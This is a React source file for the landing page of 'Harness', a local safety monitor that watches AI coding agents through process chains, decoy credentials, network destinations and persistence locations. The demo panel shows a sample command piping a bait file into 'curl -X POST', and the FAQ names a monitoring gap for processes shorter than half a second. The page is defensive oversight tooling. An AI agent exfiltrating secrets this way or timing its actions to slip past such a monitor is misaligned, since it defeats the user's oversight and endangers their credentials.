import Scenario from './_components/scenario.jsx';
import ScorePlay from './_components/scoreplay.jsx';
import Downloads from './downloads.jsx';
import { Pug } from './_components/brand.jsx';

const AGENTS = ['Claude Code', 'Codex', 'Gemini CLI', 'Cursor', 'Copilot', 'opencode', 'Amp'];
const FEED = ['git status', 'pnpm test', 'node build.mjs', 'git diff --stat', 'rg "TODO" src', 'pnpm lint', 'git add -A', 'tsc --noEmit'];

function Hero() {
  return (
    <section className="hero">
      <div className="wrap hero-grid">
        <div className="hero-copy">
          <p className="eyebrow">A safety harness for AI coding agents</p>
          <h1>Let your agent run.<br /><span>Keep it on a harness.</span></h1>
          <p className="lead">Harness watches everything your coding agent does on your computer, including the parts its window leaves out, and pauses it before something risky finishes.</p>
          <p className="hero-cta">
            <a className="btn btn-ink" href="#download">Download for macOS</a>
            <a className="btn btn-line" href="/demo">Try the live demo <span aria-hidden="true">→</span></a>
          </p>
          <p className="hero-note">Runs locally. No account. Nothing leaves your machine.</p>
        </div>

        <div className="panel-wrap" aria-hidden="true">
          <Pug size={132} className="panel-pug" />
          <div className="panel">
            <div className="panel-top"><b>Harness</b><span className="live"><i />Watching 2 sessions</span></div>
            <div className="panel-score">
              <span className="ring"><b>100</b></span>
              <p><b>Clear</b><span>Nothing concerning so far.</span></p>
            </div>
            <ul className="panel-sessions">
              <li><b>Claude Code</b><span>my-app</span><em>active</em></li>
              <li><b>Codex</b><span>api-server</span><em>active</em></li>
            </ul>
            <div className="panel-feed"><ol>{[...FEED, ...FEED.slice(0, 3)].map((c, i) => <li key={i}><span>claude</span>{c}</li>)}</ol></div>
          </div>
        </div>
      </div>
      <div className="wrap">
        <ul className="agents" aria-label="Agents Harness recognizes">
          <li className="agents-label">Recognizes</li>
          {AGENTS.map((a) => <li key={a}>{a}</li>)}
        </ul>
      </div>
    </section>
  );
}

function Watch() {
  return (
    <section id="watch" className="sec">
      <div className="wrap">
        <header className="sec-head" data-reveal>
          <p className="eyebrow">What it catches</p>
          <h2>Everything the window leaves out.</h2>
          <p>Four kinds of evidence, checked against a fixed list of rules. A model can summarize a session afterwards, but it never decides what counts as dangerous.</p>
        </header>
        <div className="bento">
          <article className="card card-wide" data-reveal>
            <div className="viz viz-tree">
              <p><code>claude</code></p>
              <p style={{ '--d': 1 }}><code>zsh -lc</code></p>
              <p style={{ '--d': 2 }}><code>npm install</code></p>
              <p style={{ '--d': 3 }} className="is-hot"><code>node install.js</code><b>came from a package</b></p>
            </div>
            <h3>The whole process chain</h3>
            <p>Every program an agent starts, and every program those start. When something goes wrong three levels down, Harness says which package did it instead of blaming the agent.</p>
          </article>
          <article className="card" data-reveal>
            <div className="viz viz-file">
              <p className="file-name">aws_credentials<b>decoy</b></p>
              <p><code>aws_access_key_id = AKIA…7F3A</code></p>
              <p><code>aws_secret_access_key = hb_9c1e…</code></p>
            </div>
            <h3>Decoy secrets</h3>
            <p>Fake keys, planted where a thief would look, each holding a value unique to your computer. No honest task opens them, so a single read is proof.</p>
          </article>
          <article className="card" data-reveal>
            <div className="viz viz-net">
              <p><i className="ok" />api.anthropic.com</p>
              <p><i className="ok" />registry.npmjs.org</p>
              <p className="is-hot"><i />203.0.113.7<b>unrecognized</b></p>
            </div>
            <h3>Where data goes</h3>
            <p>Every connection an agent’s processes open, by name. The services agents normally talk to stay quiet. Uploads and strangers do not.</p>
          </article>
          <article className="card card-wide" data-reveal>
            <div className="viz viz-persist">
              <p><code>~/.zshrc</code><span>runs in every new terminal</span></p>
              <p><code>~/Library/LaunchAgents</code><span>runs at every login</span></p>
              <p><code>crontab</code><span>runs on a schedule</span></p>
            </div>
            <h3>Things built to outlast the session</h3>
            <p>Startup files, login items and scheduled tasks are how software stays on a computer after you close the window. Harness watches those places and flags anything that writes to them.</p>
          </article>
        </div>
      </div>
    </section>
  );
}

function Respond() {
  const items = [
    { when: 'Before', h: 'Block it', p: 'In Claude Code, Harness checks each action before it runs, in about 10 milliseconds. Decoy reads and password dumps are refused. Uploads and force-pushes ask you first, with the reason attached.', foot: 'Claude Code hook' },
    { when: 'During', h: 'Pause it', p: 'For every agent, Auto-protect freezes the agent and each process under it the moment something dangerous shows up. Nothing is killed. You can let it continue or end it.', foot: 'Any recognized agent' },
    { when: 'After', h: 'Explain it', p: 'One click turns the event log into a short summary anyone can read, written by a model running on your own machine, or straight from the rules if you don’t have one.', foot: 'Local model, optional' },
  ];
  return (
    <section id="respond" className="sec sec-tint">
      <div className="wrap">
        <header className="sec-head" data-reveal>
          <p className="eyebrow">What it does about it</p>
          <h2>Seeing is half of it.</h2>
        </header>
        <ol className="respond">
          {items.map((it) => (
            <li key={it.h} data-reveal>
              <p className="respond-when">{it.when}</p>
              <h3>{it.h}</h3>
              <p>{it.p}</p>
              <p className="respond-foot">{it.foot}</p>
            </li>
          ))}
        </ol>
      </div>
    </section>
  );
}

function Score() {
  return (
    <section id="score" className="sec">
      <div className="wrap">
        <header className="sec-head" data-reveal>
          <p className="eyebrow">The score</p>
          <h2>One number for how it’s going.</h2>
          <p>Every session starts at 100. Risky events cost points in six groups, each with a cap, so one noisy category can’t sink the score on its own. Costs halve every 12 hours.</p>
        </header>
        <div data-reveal><ScorePlay /></div>
      </div>
    </section>
  );
}

function Privacy() {
  return (
    <section id="privacy" className="sec sec-dark">
      <div className="wrap privacy">
        <div data-reveal>
          <p className="eyebrow eyebrow-dark">Privacy</p>
          <h2>It watches your agent.<br />Nobody watches you.</h2>
        </div>
        <ul data-reveal>
          <li><code>127.0.0.1</code><p>The monitor and its dashboard are served from your own computer and nowhere else.</p></li>
          <li><code>0 accounts</code><p>No sign-up and no telemetry. The event log is a file on your disk.</p></li>
          <li><code>local model</code><p>Summaries come from Ollama on your machine. Cloud models are skipped.</p></li>
        </ul>
      </div>
    </section>
  );
}

function DemoCta() {
  return (
    <section className="sec">
      <div className="wrap">
        <div className="democta" data-reveal>
          <div>
            <p className="eyebrow">Live demo · Powered by Gemini</p>
            <h2>Gemini plays the agent.<br />Harness keeps score.</h2>
            <p>Pick a situation and Gemini writes a coding session to match, attacker included. Every command it invents is then judged by the same rules the app runs. Nothing executes, and nothing on your computer is read.</p>
            <p><a className="btn btn-ink" href="/demo">Open the live demo <span aria-hidden="true">→</span></a></p>
          </div>
          <ol className="democta-viz" aria-hidden="true">
            <li><code>npm install</code><b className="tag">Note</b></li>
            <li><code>node install.js</code><b className="tag">Clear</b></li>
            <li className="is-hot"><code>cat ~/.harness/bait/… | curl -X POST</code><b className="tag tag-bad">Dangerous</b></li>
            <li className="is-pause"><span>Paused before the next step</span></li>
          </ol>
        </div>
      </div>
    </section>
  );
}

const FAQ = [
  ['Which agents does it work with?', 'Harness recognizes Claude Code, Codex, Gemini CLI, Cursor’s agent, Copilot, opencode and Amp by their process names, and can pause any of them. It reads session logs for Claude Code and Codex. Blocking an action before it runs is available for Claude Code only, in folders you choose to protect.'],
  ['Does anything leave my computer?', 'No. The log is a file on your disk, and summaries come from a local model. The one exception is the demo on this website, which is a separate thing: it asks Google Gemini to write a fictional session and never touches your machine.'],
  ['Can it actually stop a command?', 'In Claude Code, yes: the action is refused before it starts. For other agents Harness pauses the process tree once it sees a dangerous event, which usually lands before an upload completes but is not guaranteed to.'],
  ['What can it miss?', 'A process that starts and finishes in under about half a second can slip between checks. The decoy files still record that they were read. The white paper lists every limit we know about.'],
  ['Does it need admin rights?', 'No. It runs as you. The desktop build is not signed with an Apple Developer ID yet, so macOS asks you to confirm the first time you open it.'],
];

export default function Home() {
  return (
    <>
      <Hero />
      <Scenario />
      <p className="wrap scn-foot">This walkthrough follows the scripted attack that ships with Harness. Real timing depends on a half-second check. <a href="/whitepaper#known-limits">What it can miss</a></p>
      <Watch />
      <Respond />
      <Score />
      <Privacy />
      <DemoCta />
      <section id="faq" className="sec sec-tint">
        <div className="wrap faq-grid">
          <header className="sec-head" data-reveal>
            <p className="eyebrow">Questions</p>
            <h2>Short, honest answers.</h2>
            <p>The long ones are in the <a href="/whitepaper">white paper</a>.</p>
          </header>
          <div className="faq" data-reveal>
            {FAQ.map(([q, a]) => <details key={q}><summary>{q}</summary><p>{a}</p></details>)}
          </div>
        </div>
      </section>
      <section id="download" className="sec dl-sec">
        <div className="wrap dl-wrap">
          <Pug size={168} className="dl-pug" />
          <h2>Put your agent on a harness.</h2>
          <p className="lead">Free, with the source on GitHub. Lives in your menu bar.</p>
          <div id="downloads" />
          <noscript><p>Downloads are listed on <a href="https://github.com/alexlautin/emoryhacksf26">GitHub</a>.</p></noscript>
        </div>
      </section>
      <Downloads />
    </>
  );
}
